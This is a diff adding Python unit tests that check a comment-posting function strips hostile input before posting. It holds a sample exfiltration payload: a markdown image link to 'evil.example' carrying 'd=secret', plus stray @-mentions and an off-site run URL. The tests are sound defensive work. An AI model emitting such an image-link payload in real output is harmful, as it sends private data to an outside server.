@@ -133,6 +133,32 @@ class Comment(unittest.TestCase):
         self.assertFalse(ok)
         self.assertFalse(body.startswith("Review of"))
 
+    def test_failure_note_quotes_nothing(self):
+        # A first line that is not a verdict, which would have been quoted.
+        hostile = "x` ![a](https://evil.example/p.png?d=secret) `y @someone"
+        for text in (f"{hostile}\n\n{PROBED}", f"{OK}\n\n1. {hostile}{PROBED}",
+                     f"{OK}\n\n[x](https://evil.example/{hostile}){PROBED}"):
+            body, ok = comment(text, HEAD, "full", "URL", set())
+            self.assertFalse(ok)
+            for part in ("evil", "![", "someone", "secret"):
+                self.assertNotIn(part, body, text)
+
+    def test_posted_comment_mentions_no_one(self):
+        body, ok = comment(f"{OK}\n\nAsk @someone, or @org/team.{PROBED}", HEAD, "full", "URL", set())
+        self.assertTrue(ok)
+        self.assertNotRegex(body, r"@[A-Za-z0-9_-]")
+        self.assertIn("@​someone", body)
+        # Lean's attributes stay as they are.
+        body, _ = comment(f"{OK}\n\nThe `@[simp]` lemma.{PROBED}", HEAD, "full", "URL", set())
+        self.assertIn("`@[simp]`", body)
+
+    def test_posted_comment_is_checked_as_posted(self):
+        # The run's URL is the only thing a note links to, and a run URL
+        # outside github.com is caught too.
+        body, ok = comment("", HEAD, "full", "https://evil.example/run", set())
+        self.assertFalse(ok)
+        self.assertNotIn("evil", body)
+
     def test_review_is_posted_as_written(self):
         # The comment counts as the review, so it is the review itself,
         # with no note added.
